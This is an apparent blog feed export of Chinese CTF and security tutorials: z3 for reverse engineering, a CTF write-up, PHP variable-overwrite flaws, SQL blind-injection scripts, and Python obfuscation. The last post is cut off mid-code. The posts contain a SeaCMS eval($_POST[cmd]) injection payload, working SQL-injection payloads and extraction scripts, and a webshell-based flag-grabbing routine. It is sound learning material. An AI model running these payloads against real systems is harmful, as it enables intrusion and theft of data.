    <content type="text"><![CDATA[本文首发于：安恒讲武堂 前几天在群里看到有人聊到z3，正好在寒假的时候仔细研究过这个模块，今天就和大家分享下z3的简易使用方法和在ctf中该模块对于求解逆向题的帮助 简介z3z3是由微软公司开发的一个优秀的SMT求解器，它能够检查逻辑表达式的可满足性，通俗的来讲我们可以简单理解为它是一个解方程的计算器 SMTSMT即可满足性模理论，它是对一个实际问题求解的特征描述，这些特征就是我们所求解的特征，SMT会使用一个或多个这样的特征描述式求解，再取每一个特征描述式所对应解的交集。 详细关于SMT的理论可以参考：https://www.cnblogs.com/steven-yang/p/7104068.html 基本数据类型在Python中使用Z3模块，我们的所求结果一般有以下几种数据类型 Int #整型 Bool #布尔型 Array #数组 BitVec(&apos;a&apos;,8) #char型 其中BitVec可以是特定大小的数据类型，不一定是8，例如C语言中的int型可以用BitVec(‘a’,32)表示 基本语句在Python中使用该模块，我们通常用到如下几个语句 Solver() Solver()命令会创建一个通用求解器，创建后我们可以添加我们的约束条件，进行下一步的求解 add() add()命令用来添加约束条件，通常在solver()命令之后，添加的约束条件通常是一个逻辑等式 check() 该函数通常用来判断在添加完约束条件后，来检测解的情况，有解的时候会回显sat，无解的时候会回显unsat model() 在存在解的时候，该函数会将每个限制条件所对应的解集的交集，进而得出正解。 模块安装linux下可用如下命令： git clone https://github.com/Z3Prover/z3.git cd z3 python scripts/mk_make.py cd build make make install z3的简单使用求解流程上文提到我们可以将z3理解为一个解方程的计算器，对于求解方程，我们通常会经历四个步骤：设未知数，列方程，解方程，得到正解 使用z3模块，在我的眼中也是同我们解方程一样需要经历四个步骤，下面我们简单来看一下 假设有方程组： 30x+15y=675 12x+5y=265 我们使用z3来解这个方程组： 1.设未知数 In [1]: from z3 import * In [2]: x = Real(&apos;x&apos;) In [3]: y = Real(&apos;y&apos;) 2.列方程 In [4]: s = Solver() In [5]: s.add(30*x+15*y==675) In [6]: s.add(12*x+5*y==265) 3.判断方程解的情况并解方程 In [7]: s.check() Out[7]: sat In [8]: result = s.model() 4.得出正解 In [9]: print result [y = 5, x = 20] 在交互环境中，我们的求解过程如图 最终完整的代码如下： from z3 import * x = Real(&apos;x&apos;) y = Real(&apos;y&apos;) s = Solver() s.add(30*x+15*y==675) s.add(12*x+5*y==265) if s.check() == sat: result = s.model() print result else: print &apos;no result&apos; 可以看到我们很轻松的得到了方程组的解 利用z3解逻辑算数题可能上面解方程组大家觉得这个模块给我们带来的方便并没有那么大，那么通过下面的题目我们或许会对z3有一个全新的认识 在网上翻了很多题目，最终我找到了15年的一道公务员考试题 这个问题的逻辑稍显复杂，我们现在用z3做一下，同样也需要经历上面四个步骤：设，列，解，得 设：2014年小李年龄：a，小李弟弟年龄：b，小王年龄：c，小王哥哥年龄：d 节省篇幅，直接写出求解代码： from z3 import * a = Real(&apos;a&apos;) b = Real(&apos;b&apos;) c = Real(&apos;c&apos;) d = Real(&apos;d&apos;) s = Solver() s.add(b+2==a) s.add(c+2==d) s.add(a+5==d) s.add(b+c-20-20==15) if s.check()==sat: print s.model() else: print &quot;no result&quot; 运行结果： 可以看到我们仅用几行代码就得出了答案，如果用普通的解法，我们要算4个方程所组成的方程组，所以使用z3有时候会大大增加我们的计算效率，简化我们的计算步骤。 z3在逆向题目中的应用本篇以ISCC2018的一道RE题目为例，题目名为：My math is bad 将文件拖入ida中定位到main函数，F5反编译 可以看到有一个if判断，猜测if中的函数为关键函数，进入该函数 在这里看到了rand()函数，这是一个生成伪随机数的函数，所以我们几乎不可能通过逆向的方式，来将flag计算出来，继续阅读代码，发现该随机数种子是固定的，我们可以将种子计算出来，这样就可以进而获得系统生成的随机数，在计算种子的时候，我们可以使用z3模块 为了增加可读性，将关键函数的反汇编代码修饰一下： __int64 v1; // ST40_8 __int64 v2; // ST48_8 __int64 v3; // [rsp+20h] [rbp-60h] __int64 v4; // [rsp+28h] [rbp-58h] __int64 v5; // [rsp+30h] [rbp-50h] __int64 v6; // [rsp+38h] [rbp-48h] __int64 v7; // [rsp+50h] [rbp-30h] __int64 v8; // [rsp+58h] [rbp-28h] __int64 v9; // [rsp+60h] [rbp-20h] __int64 v10; // [rsp+68h] [rbp-18h] __int64 v11; // [rsp+70h] [rbp-10h] __int64 v12; // [rsp+78h] [rbp-8h] if ( strlen(s) != 32 ) return 0LL; v3 = unk_6020B0; v4 = unk_6020B4; v5 = unk_6020B8; v6 = unk_6020BC; if ( a * *s - b * c != 2652042832920173142LL ) goto LABEL_15; if ( 3LL * c + 4LL * b - a - 2LL * *s != 397958918 ) goto LABEL_15; if ( 3 * *s * b - c * a != 3345692380376715070LL ) goto LABEL_15; if ( 27LL * a + *s - 11LL * b - c != 40179413815LL ) goto LABEL_15; srand(c ^ a ^ *s ^ b); v1 = rand() % 50; v2 = rand() % 50; v7 = rand() % 50; v8 = rand() % 50; v9 = rand() % 50; v10 = rand() % 50; v11 = rand() % 50; v12 = rand() % 50; if ( v6 * v2 + v3 * v1 - v4 - v5 != 61799700179LL || v6 + v3 + v5 * v8 - v4 * v7 != 48753725643LL || v3 * v9 + v4 * v10 - v5 - v6 != 59322698861LL || v5 * v12 + v3 - v4 - v6 * v11 != 51664230587LL ) { LABEL_15: result = 0LL; } else { result = 1LL; } return result; } 首先我们来计算下a,s,b,c的值： from z3 import * a = Int(&apos;a&apos;) b = Int(&apos;b&apos;) s = Int(&apos;s&apos;) c = Int(&apos;c&apos;) l = Solver() l.add(a*s-b*c==2652042832920173142) l.add(3*c+4*b-a-2*s==397958918) l.add(3 *s * b - c * a == 3345692380376715070) l.add(27 * a + s - 11 * b - c == 40179413815) if l.check()==sat: print l.model() else: print &apos;no result&apos; 然后我们计算出srand(c ^ a ^ *s ^ b);中c^a^s^b的值 c = 829124174 b = 862734414 s = 1869639009 a = 1801073242 result = a^b^c^s print result result的值为103643451 接下来我们继续跟进程序流程，计算rand函数所生成的几个值 使用ida动态调试程序，跳转到srand()函数，因为是直接跳过来的，srand()还没有参数，而刚才我们已将该参数的值通过z3计算了出来，所以在程序运行到mov edi, eax时，直接将eax的值改为103643451即可 然后我们跟进程序，得到了v1的值 继续跟进获得了下面的几个生成值 v1 = 0x16 v2 = 0x27 v7 = 0x2d v8= 0x2d v9 = 0x23 v10= 0x29 v11 = 0xd v12 = 0x24 接着我们到了if的判断 其中v3 v4 v5 v6是未知的，所以在这里我们可以设四个未知数，其他数我们通过前面已经计算出来了，使用z3求解这四个未知数即可 from z3 import * v3 = Int(&apos;v3&apos;) v4 = Int(&apos;v4&apos;) v5 = Int(&apos;v5&apos;) v6 = Int(&apos;v6&apos;) v1 = 0x16 v2 = 0x27 v7 = 0x2d v8= 0x2d v9 = 0x23 v10= 0x29 v11 = 0xd v12 = 0x24 l = Solver() l.add(v6 * v2 + v3 * v1 - v4 - v5 == 61799700179) l.add(v6 + v3 + v5 * v8 - v4 * v7 == 48753725643) l.add(v3 * v9 + v4 * v10 - v5 - v6 == 59322698861) l.add(v5 * v12 + v3 - v4 - v6 * v11 == 51664230587) if l.check() == sat: print l.model() else: print &apos;no result&apos; 运行结果 至此我们需要输入的值都计算出来了 c = 829124174 b = 862734414 s = 1869639009 a = 1801073242 v6 = 1195788129 v4 = 828593230 v3 = 811816014 v5 = 1867395930 这里我们需要将abcs的顺序确定一下，在bss段中可看到其顺序 然后我们需要将这些数字转换为字符串输入，这里用到了libnum库 import libnum c = 829124174 b = 862734414 s = 1869639009 a = 1801073242 v6 = 1195788129 v4 = 828593230 v3 = 811816014 v5 = 1867395930 array = [s,a,c,b,v3,v4,v5,v6] result = &quot;&quot; for i in array: result = result + libnum.n2s(i)[::-1] print result 运行脚本 将字符串输入后我们即可得到flag 总结z3是一个强大的约束求解器，它不仅能处理一些看起来很复杂的逻辑问题，在逆向领域中往往可以简化我们计算步骤，增加求解效率，尤其是在ctf比赛中一些繁杂的RE题目通过z3来解往往显得非常简单，我们在解决问题时如果能灵活应用z3，往往会有意想不到的效果。]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019嘉韦思杯线上赛wp]]></title>
    <url>%2F2019%2F04%2F01%2F2019%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[周六做了一下嘉韦思杯，题目很入门，这里记录一下，太久没碰RE就没做了（其实是不会） 作战计划根据题目是seacms,百度一下seacms的漏洞，找到这么一篇文章 https://www.cnblogs.com/leixiao-/p/9786034.html 根据文章中的描述，构造如下payload http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd]) 用蚁剑链接，在服务器根目录下发现flag 土肥原贤二很简单的题目，用sqlmap就可以跑出来 吴佩孚base64解密链接中字符串，得到一串jsfuck，在浏览器执行即可得到flag 日军空袭这应该是一串不全的base64代码，解密过程中报了一次错，然后站点自动补了一段字符串 经过几次解密 得到 fB__l621a4h4g_ai{&amp;i} 栅栏解密即可 飞虎队题目是希尔加密 在网上搜索很久 找到了下面的站点 http://2-dreamfever.lofter.com/post/1d226cf1_748daf4 惊喜的是里面的矩阵和题目中的一样 照着他的思路我们把密文转成数字 a=0,b=1,c=2,d=3… 解密矩阵 8 16 27 8 99 24 27 24 27 矩阵为3*3 所以将密文3个分为一组 去乘解密矩阵然后mod(26) 得到 hillisflagxx 戴星炳上脚本 import re import requests s = requests.Session() url = &apos;http://47.103.43.235:82/web/a/index.php&apos; r = s.get(url) #r.encoding = &apos;utf-8&apos; print(r.text) shi = re.compile(&apos;&lt;/p&gt;&lt;p&gt;(.*?)&lt;/p&gt;&apos;,re.S) num = re.findall(shi, r.text) print(num) #print (&apos;result:\n\n%s=%d\n&apos; % (num, eval(num))) #r = s.post(url, data={&apos;result&apos;: eval(num[0])}) #print (r.text) numstr = &quot;&quot; result = eval(num[0]) print(result) html = s.post(url,data={&apos;result&apos;:result}) print(html.text) 大美晚报扫描二维码，没发现有用的信息 winhex打开，在末尾发现zip数据段，提取出来 根据提示QQ号，暴力破解压缩包密码 打开即可获得flag 池步洲打开题目，查看源码，发现index.phps 下载后 两个字符串不同但是sha1值要相同，这里可以用数组绕过 袁殊基础的RSA，用RSAtools跑一下就出来了 晴气庆胤打开题目查看源码，发现了如下代码 MD5碰撞的题目，网上有现成的整理的payload https://www.cnblogs.com/zaqzzz/p/10029887.html 潘汉年 题目是这样的 然后提示flag格式，说明flag{和密文的前五位是对应的 转换一下密文和flag{的ascii码对应的数值 脚本： a = &quot;bg[`s&quot; b = &quot;flag{&quot; a = list(a) b = list(b) for i in b: print(ord(i)) print(&apos;\n\n&apos;) for e in a: print(ord(e)) 可以看到他们ascii码对应数值的差是递增的4,5,6,7…… 这样题目就清晰了，解密flag脚本如下 a = &quot;bg[`sZ*Zg&apos;dPfP`VM_SXVd&quot; a = list(a) temp = 4 flag = &quot;&quot; for i in a: print(ord(i)) result = ord(i)+temp temp = temp+1 flag = flag + chr(result) print(flag) 总结可能是是第一届的原因吧，主办方或许有的地方经验还不太够，但是也能看出主办方是花了一些心思的，尤其是UI好评，也希望他们越办越好。]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈变量覆盖漏洞]]></title>
    <url>%2F2019%2F03%2F31%2F%E6%B5%85%E8%B0%88%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[本文首发于：安恒网络空间安全讲武堂 最近在跟师傅们讨论代码审计技巧的时候，好几个师傅都提到了变量覆盖漏洞，对于这一块的知识我并不是了解很多，网上的说明或多或少的都有一些粗略和不足，所以在这几天闲暇之余，我特意地将PHP变量覆盖漏洞进行了系统的总结，在此记录一下，个人难免会有疏漏和不足之处，非常欢迎各位师傅的补充与纠正 简介我认为一个比较正确的定义是：在PHP代码中将自定义参数值替换为原有参数值的情况称为变量覆盖。 变量覆盖漏洞一般单体作用很小，并不能造成很大危害，但是在与其他应用代码或漏洞结合后，其造成的危害可能是无法估量的，最简单的例如购买商品的支付系统，某些爆出的0元支付下单的BUG就常常可以见到变量覆盖漏洞的身影。 常见的漏洞引发类型由$$变量赋值引发的覆盖$$是一种可变变量的写法，它可以使一个普通变量的值作为可变变量的名字，这种类型常常会使用遍历的方式来释放变量的代码，最常见的就是foreach的遍历，示例代码如下： &lt;?php $yml = 10; echo $yml; echo &quot;&lt;br&gt;&quot;; foreach ($_POST as $k =&gt; $v){ $$k = $v; echo $yml; } ?&gt; 无任何操作时的正常输出： 当post内容为yml=1000时： 很明显看到这里$yml的值变为了1000，我们成功的完成了一次变量覆盖。 再拿出一个我前几天给学弟们出的一个小题为例子： 代码： &lt;?php include(&apos;flag.php&apos;); $flag = &apos;flag{it_Is_Y0ur_flag}&apos;; foreach ($_POST as $key =&gt; $value) { $a = $value; $$$key=$value; $ccut = $flag; $yml = $_GET[&quot;flag&quot;]; if ($yml == &quot;iwantflag&quot;) { if ($ccut == &quot;flag&quot;) { echo $fl4g; } else { echo &quot;you will get it&quot;; } } else { echo &quot;nonono&quot;; } # code... } highlight_file(__FILE__); ?&gt; 题目的本质还是变量覆盖，题目中核心的部分就是需要将$flag的值由flag{it_Is_Y0ur_flag}覆盖为flag,仔细阅读代码流程再结合上面的例子就可以轻松解出，我这里直接给出payload： extract()函数使用不当导致的变量覆盖该函数可以将变量从数组中导入当前的符号表 我们看一下在w3school中函数的定义 这里我们要注意一下该函数的第二个参数，该参数的选择就确定了将变量导入符号表时的行为，在实际生产生活中，我们常常使用的值有EXTR_OVERWRITE和EXTR_SKIP。 当值设定为EXTR_SKIP时，在导入符号表的过程中，如果变量名发生冲突，则跳过该变量不进行覆盖，当值为EXTR_OVERWRITE时如果发生冲突，则覆盖已有变量，该函数在不指定第二个参数时默认使用EXTR_OVERWRITE，这就为我们提供了覆盖的可能。 示例代码： &lt;?php $yml = 10; echo &apos;out0:&apos;.$yml; extract($_POST); echo &apos;&lt;br&gt;&apos;; echo &quot;out1:&quot;.$yml; ?&gt; 无post输入时 输入yml=199时： 我们成功的将$yml的值从10覆盖为了199 全局变量的覆盖如果某些变量没有被初始化，并且黑客可以控制，将会是一件很危险的事情，在这种情况下，漏洞触发的前提是register_globals为ON(register_globals的值可以在php.ini中修改，我在个人的PHPstudy上发现在php5.2版本后该值默认是OFF) 示例代码： &lt;?php echo (int)ini_get(&quot;register_globals&quot;); echo &apos;&lt;br&gt;&apos;; echo &quot;yml=&quot;.$yml; ?&gt; 当register_globals为OFF时 可以我们无法将未初始化的变量进行注册，但是当register_globals的值为ON时，结果如下 可以看到我们成功注册了一个未初始化的变量 还有一种通过$GLOBALS获取的变量在使用不当时也会导致变量覆盖，同样漏洞触发的前提是register_globals为ON 还是用上面的示例代码： 我们成功通过注入GLOBALS[yml]来改变$yml的值 parse_str()函数使用不当导致的覆盖该函数可以把查询的字符串解析到变量中，我们来看一下w3school中对该函数的定义 这里指的注意的是，如果未设置第二个参数的值，由该函数设置的变量将覆盖已存在的同名变量 所以当我们没有设置函数的第二个参数时，恶意攻击者很可能通过特定的输入来改变代码中已定义的变量的值 示例： &lt;?php $yml = &quot;cool&quot;; echo &quot;out0:&quot;.$yml; echo &quot;&lt;br&gt;&quot;; $a = $_GET[&apos;a&apos;]; parse_str($a); echo &quot;out1:&quot;.$yml; ?&gt; 在这里我们没有设置parse_str()函数的第二个参数，现在我们来尝试构造同名变量 可以看到我们成功的使用构造同名变量的方法覆盖掉了$yml的原有值 import_request_variables所导致的变量覆盖该函数可以将 GET／POST／Cookie 变量导入到全局作用域中，我们看一下该函数的定义(在PHP5.4之后的版本中，该函数将不再使用) 该函数的第二个参数用于设置注册变量的前缀，漏洞触发的原因是当第二个参数未进行设置时，将会出现覆盖全局变量的情况 示例： &lt;?php $yml = &quot;happy&quot;; echo &quot;out0:&quot;.$yml; echo &quot;&lt;br&gt;&quot;; import_request_variables(&apos;P&apos;); echo &quot;out1:&quot;.$yml; ?&gt; 无输入时： 代码没有设置import_request_variables的第二个参数，我们来设置同名变量输入看是否能够进行覆盖 在这里我们成功的注册了同名的全局变量将原有变量的值进行了覆盖。 漏洞防御对于第一种情况，在审计的时候要注意$$的赋值语句，使用恰当的方式防止变量覆盖漏洞的发生 对于第二种情况，在使用extract()函数时，可以指定将第二个参数设置为EXTRSKIP，并且留意变量的获取顺序，控制好用户的输入。 对于第三种情况，强烈推荐将registerglobals设置为Off 对于第四种情况，我们应该在使用parse_str()时养成指定第二个参数的习惯，这样才能避免变量被覆盖 对于最后一种情况，我们同样要指定第二个函数参数来设置要注册的变量前缀，不过这个函数现在已经很少用了。 总结变量覆盖漏洞触发的灵活性较高，但我们只要抓住根本问题，控制好用户输入并且规范代码的书写，还是可以进行防范的，该漏洞经常在ctf题目中作为一个考点出现，只要我们紧跟代码逻辑，还是很容易解出题目的。]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql盲注的学习]]></title>
    <url>%2F2019%2F03%2F23%2Fsql%E7%9B%B2%E6%B3%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[本文首发于：安恒网络空间安全讲武堂 这几天在学习sql注入的有关内容，今天记录一下我认为比较重要的部分，即sql盲注，我一开始学习的时候看到了好多的函数，看着看着就弄混了，相信不少新入门的师傅也有类似的困惑，经过多番心理斗争，我终于决定将这部分知识好整理一下，同时也给大家分享一下我在学习过程中编写的几个自动注入脚本，也欢迎各位师傅的指点和斧正。 函数整理这里我先将所用到的功能函数整理一下，同时也欢迎各位师傅的补充和纠正 left(m,n) #从左向右截取字符串m返回其前n位 substr(m,1,2) #取字符串m的左边第一位起，2字长的字符串 ascii(m) #返回字符m的ASCII码 if(str1,str2,str3) #如果str1正确就执行str2，否则执行str3 sleep(m) #使程序暂停m秒 length(m) #返回字符串m的长度 count(column_name) #返回指定列的值的数目 concat()函数和group_concat()区别concat() 该函数用于联合两条数据结果，通常是联合两个字段名，如concat(username,0x23,passwd),数据将由#分割开 group_concat() 这个函数与concat()用法是类似的，但如果管理员账号不止一个的话，concat一次只能注出一组用户名密码，而使用group_concat()可以实现一次注出多组数据。 盲注类型基于布尔的盲注特征 被注入的页面没有sql语句执行错误的显示，页面只有正常返回和不正常返回两种状态 示例 这里我拿sqli-labs的less8作为布尔型盲注的例子 我们可以看到这个页面正常会返回You are in………..而不正常的时候会无任何返回，这就很符合布尔盲注的特征 正常返回： 非正常返回： 构造?id=1’ and 1=1 %23时正常返回 这里基本就可以确定可以使用布尔盲注来获得数据库中的数据 接下来我们来猜解库名，在猜解库名之前，我们首先需要知道库名的长度 这里我们就可以利用length()函数来进行长度的爆破： http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and (length(database())=m) %23 //m=1,2,3,4..... 代码如下： 结果 接下来开始进行库名的猜解，这里用到了ascii()函数和substr()函数，具体的语句如下： http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr(database(),m,1))=n %23 //其中m 和 n是可变的参数 猜解库名的自动化脚本函数如下： 结果如下： 猜解表名和字段和猜解库名是一样的，篇幅原因将代码直接放出： import requests def get_dblength(base_url): url = base_url+&quot;&apos; and (length(database())={0}) %23&quot; base_num = 100 for i in range(0,base_num): url1 = url.format(i) print(url1) result = len(requests.get(url1).text) if result == base_result: print(&quot;库名长度:&quot;,i) break return i def get_dbname(base_url,db_length): dict = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&apos; dbname = &quot;&quot; url = base_url+&quot;&apos; and ascii(substr(database(),{0},1))={1} %23&quot; for i in range(1,db_length+1): for m in dict: m_ascii = ord(m) url2 = url.format(i,m_ascii) result = requests.get(url2) if len(result.text) == base_result: dbname += m print(dbname) break print(&quot;库名:&quot;,dbname) def get_table_length(): url = base_url + &quot;&apos; and (select length(table_name) from information_schema.tables where table_schema = database() limit {0},1)={1}%23&quot; for i in range(0,20): url1 = url.format(2,i) result = requests.get(url1) if base_result == len(result.text): print(&quot;表名长度:&quot;,i) break return i def get_table_name(table_length): dict = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&apos; table_name = &quot;&quot; url = base_url + &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit {0},1),{1},1))={2} %23&quot; for i in range(1,table_length + 1): for m in dict: ascii_m = ord(m) url1 = url.format(2,i,ascii_m) result = requests.get(url1).text if base_result == len(result): table_name +=m print(&quot;表名:&quot;,table_name) break return table_name if __name__ == &apos;__main__&apos;: base_url = &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; base_result = len(requests.get(base_url).text) dblength = get_dblength(base_url) get_dbname(base_url, dblength) get_table_length() get_table_name(7) 基于时间的盲注特征 被注入页面无论作何输入都回显相同的数据，导致我们无法判断注入是否成功，这时我们就可以使用以sleep()函数为核心的注入语句进行延时注入 示例 以sqli-labs less9作为示例 不管我们输入什么页面都显示You are in………..这时我们就可以用延时注入的方法进行数据库数据的获取 同样我们需要先获取库名的长度，然后再获取库名 这里主要使用到了sleep(),substr()和length()函数 获取库名长度： http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if((length((select database()))=m),sleep(5),NULL) %23//其中m为整型可变参数，如果猜解正确，页面将会暂停响应5秒 获取库名： http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if((substr((select database()),m,1)=&apos;n&apos;),sleep(5),NULL) %23//其中m为整形,n为char型可变参数 爆破代码： import requests def db_post(url): try: result = requests.get(url,timeout=4) return 0 except: return 1 def get_db_length(): url = base_url + &quot;&apos; and if((length((select database()))={0}),sleep(5),NULL) %23&quot; for i in range(0,20): url1 = url.format(i) temp = db_post(url1) if temp == 1: print(&quot;数据库名长度:&quot;,i) break return i def get_db_name(db_length): db_name = &quot;&quot; url = base_url + &quot;&apos; and if((substr((select database()),{0},1)=&apos;{1}&apos;),sleep(5),NULL) %23&quot; print(&quot;开始猜解库名&quot;) for i in range(1,db_length+1): for m in dict: url1 = url.format(i,m) temp = db_post(url1) if temp == 1: db_name += m print(db_name) break print(&quot;库名：&quot;,db_name) return db_name if __name__ == &apos;__main__&apos;: dict = &apos;abcdefghijklmnopqrstuvwxyz&apos; base_url = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&quot; db_length = get_db_length() get_db_name(db_length) 可以看到成功将库名猜解出来 剩下的表名和字段将脚本稍作修改即可猜解出来，篇幅原因不再重复操作 基于报错的盲注(floor报错注入)原理 该类型的注入利用了mysql的8652号BUG(官方链接:https://bugs.mysql.com/bug.php?id=8652)，当使用group by对某些rand函数操作时，会返回带有敏感信息的错误信息，我们可以通过特定的sql语句组合来控制返回敏感信息的内容，从而实现间接的注入 示例 对于BUG触发的原理本篇不做分析，通过对该类型注入的资料收集，根据网络上的payload我整理了一份有效的注入语句 以sqli-labs less5为实际示例 这里要用到concat和count函数 回显库名： http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select 1,count(*),concat(&quot;-&quot;,&quot;-&quot;,(select database()),&quot;-&quot;,&quot;-&quot;,floor(rand(0)*2))a from information_schema.columns group by a %23 接下来是表名的注入，我们同样需要知道表名的个数： http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select 1,count(*),concat(&quot;-&quot;,&quot;-&quot;,(select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;),&quot;-&quot;,&quot;-&quot;,floor(rand(0)*2))a from information_schema.columns group by a %23 表名有四个，接着注出表名： http://127.0.0.1/sqli-labs/Less-5/?id=1&apos; union select 1,count(*),concat(&quot;-&quot;,&quot;-&quot;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1),&quot;-&quot;,&quot;-&quot;,floor(rand(0)*2))a from information_schema.columns group by a %23 想注出全部表名修改limit参数即可 列名和数据同理修改查询语句就可以了。 总结盲注是一个比较费神和考验逻辑的注入方式，在注入的过程中会做很多相同的工作，为了节省时间和精力，建议大家在平时练习的时候多编写自动脚本，这样能节省很多时间，避免做更多重复无用的工作]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈几种Python源代码加密技术]]></title>
    <url>%2F2019%2F03%2F10%2F%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DPython%E6%BA%90%E4%BB%A3%E7%A0%81%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[文章首发于 安恒网络空间安全讲武堂 ：https://mp.weixin.qq.com/s/N8liasMhiiTHC_1KC3JQJQ 随着Python近年的流行，很多开发者选择用Python作为自己首选的开发语言，其简洁的语法和轻量的运行方式受到越来越多开发者的喜爱，但是对于一些个人开发者而言，某些不想开源的程序使用Python开发后很难保证其源代码不被他人剽窃，今天作者就和大家说说几种流行的Python代码加密方式，分析各种利弊并给大家推荐一下最佳的Python代码加密方案，今天主要的对象是基于Python3.X开发的应用程序(实测这些方法在2.x版本中也是可以使用的) 生成pyc文件发布简介pyc文件是一种经py文件编译后的二进制文件，他可以跨平台在Python虚拟机中运行，pyc文件打开是无法看到我们正常的源码的，例如这样： 源代码： 编译成的pyc文件： 可以看到辨识度基本为0 方法一般一个项目的代码会有多个Python文件，我们需要批量生成pyc文件，这里可以使用compileall模块，我这里的示例项目是在E盘下code文件夹中，生成代码为： import compileall compileall.compile_dir(r&apos;E:/code&apos;) 执行完后会发现项目下多了一个 pycache 文件夹，打开后就是编译后的pyc文件 代码函数变量混淆这种加密方式类似于PHP的变量混淆加密，通过奇特的变量命名方式使代码难以被读取和理解，这种混淆非常恶心，有时源代码就在你眼前，你却无法知道该段代码的含义，令人很头疼 经过一番探索，我找到了一个在线进行混淆的站点，下个月计划自己写一个混淆代码的程序，届时也会第一时间开源分享给大家 神奇的站点：http://pyob.oxyry.com/ 拿我写的一个函数作为例子(特意找了一个长的，方便大家更直观看到差别) 源代码： def get_flag(get_flag_cmd): list = [] global flag print(&quot;DEMO:http://10.10.10.10/index.php?flag= yml-flag &amp;name=666&quot;) submit_flag_url = input(&quot;请输入提交flag的链接(flag用yml-flag替换,两边加空格):&quot;) with open(&quot;data/flagshell.txt&quot;, &apos;r&apos;) as f: line = f.readline().strip() while line: list.append(line) line = f.readline().strip() i = 0 url = {} passwd = {} method = {} for data in list: if data: ls = data.split(&quot;,&quot;) method_tmp = str(ls[2]) method_tmp = method_tmp.lower() #print(method_tmp) if method_tmp == &apos;post&apos; or method_tmp == &apos;get&apos;: url[i] = str(ls[0]) method[i] = method_tmp passwd[i] = str(ls[1]) #print(url[i]) #print(method[i]) #print(passwd[i]) i += 1 else: print(&quot;[-] %s request method error!&quot; % (str(ls[0]))) else: pass time_temp = 1 while True: for j in range(len(url)): return_flag = socket_flag(url=url[j], method=method[j], passwd=passwd[j], get_flag_cmd=get_flag_cmd) flag.append(return_flag) save_flag() print(&quot;3秒后尝试提交flag:&quot;) for i in range(1, 4): s = &apos;&gt;&apos; * i + &apos;[&apos; + str(i) + &apos;s&apos; + &apos;]&apos; # 这个方法同第二种类似 print(&apos;%s&apos; % s, end=&apos;\r&apos;) # 每行以&apos;\r&apos;结尾，就可以输出在同一行 time.sleep(1) for submit_flag_str in flag: submit_flag(url=submit_flag_url, flag=submit_flag_str) print(&quot;60秒进行下一轮操作:&quot;) for i in range(1, 61): s = &apos;&gt;&apos; * i + &apos;[&apos; + str(i) + &apos;s&apos; + &apos;]&apos; # 这个方法同第二种类似 print(&apos;%s&apos; % s, end=&apos;\r&apos;) time.sleep(1) flag = [] time_temp = time_temp + 1 print(time_temp) 混淆后的代码： def get_flag (OOOO0000O0OOOOOO0 ):#line:1 O00000OOO0OO00OOO =[]#line:2 global flag #line:3 print (&quot;DEMO:http://10.10.10.10/index.php?flag= yml-flag &amp;name=666&quot;)#line:4 OO0OOOO0OOOO00OO0 =input (&quot;请输入提交flag的链接(flag用yml-flag替换,两边加空格):&quot;)#line:5 with open (&quot;data/flagshell.txt&quot;,&apos;r&apos;)as OOO0000OO0O0O00O0 :#line:6 OOOO0OO0O000O0OO0 =OOO0000OO0O0O00O0 .readline ().strip ()#line:7 while OOOO0OO0O000O0OO0 :#line:8 O00000OOO0OO00OOO .append (OOOO0OO0O000O0OO0 )#line:9 OOOO0OO0O000O0OO0 =OOO0000OO0O0O00O0 .readline ().strip ()#line:10 O00OOOO0000OO00O0 =0 #line:11 OO00OO00000OOOOOO ={}#line:12 OO0OO000O0O0OO0O0 ={}#line:13 OOOOO0OO0O00OOOOO ={}#line:14 for OO00OOOO0000OOO0O in O00000OOO0OO00OOO :#line:15 if OO00OOOO0000OOO0O :#line:16 O00O0O00O000000O0 =OO00OOOO0000OOO0O .split (&quot;,&quot;)#line:17 OO000OO00OO00OO0O =str (O00O0O00O000000O0 [2 ])#line:18 OO000OO00OO00OO0O =OO000OO00OO00OO0O .lower ()#line:19 if OO000OO00OO00OO0O ==&apos;post&apos;or OO000OO00OO00OO0O ==&apos;get&apos;:#line:21 OO00OO00000OOOOOO [O00OOOO0000OO00O0 ]=str (O00O0O00O000000O0 [0 ])#line:22 OOOOO0OO0O00OOOOO [O00OOOO0000OO00O0 ]=OO000OO00OO00OO0O #line:23 OO0OO000O0O0OO0O0 [O00OOOO0000OO00O0 ]=str (O00O0O00O000000O0 [1 ])#line:24 O00OOOO0000OO00O0 +=1 #line:28 else :#line:29 print (&quot;[-] %s request method error!&quot;%(str (O00O0O00O000000O0 [0 ])))#line:30 else :#line:31 pass #line:32 O00O00O000OOO000O =1 #line:33 while True :#line:34 for O00000O00O000O0O0 in range (len (OO00OO00000OOOOOO )):#line:35 OOO0OO0OO0000OO0O =socket_flag (url 